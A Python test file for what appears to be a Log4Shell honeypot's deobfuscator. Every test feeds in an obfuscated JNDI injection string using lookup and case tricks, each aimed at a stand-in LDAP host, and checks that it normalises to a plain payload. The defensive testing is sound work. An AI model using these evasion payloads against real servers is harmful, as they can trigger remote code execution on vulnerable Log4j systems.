from log4pot.deobfuscator import deobfuscate

def test_simple():
    assert deobfuscate("${jndi:ldap://foo/bar}") == "${jndi:ldap://foo/bar}"

def test_obfusc_colons():
    assert deobfuscate("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://foo/bar}") == "${jndi:ldap://foo/bar}"

def test_obfusc_lower():
    assert deobfuscate("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://foo/bar}") == "${jndi:ldap://foo/bar}"

def test_obfusc_env():
    assert deobfuscate("${jndi:ldap://${env:foo}/${sys:bar}}") == "${jndi:ldap://foo/bar}"

def test_obfusc_unknown():
    assert deobfuscate("${jndi${nagli:-:}ldap:${::-/}/foo/bar}") == "${jndi:ldap://foo/bar}"

def test_obfusc_nested_unknown():
    assert deobfuscate("${jnd${123%25ff:-${123%25ff:-i:}}ldap://foo/bar}") == "${jndi:ldap://foo/bar}"

def test_obfusc_jndi_mixed_case():
    assert deobfuscate("${j${k8s:k5:-ND}i${sd:k5:-:}ldap://foo/bar}") == "${jndi:ldap://foo/bar}"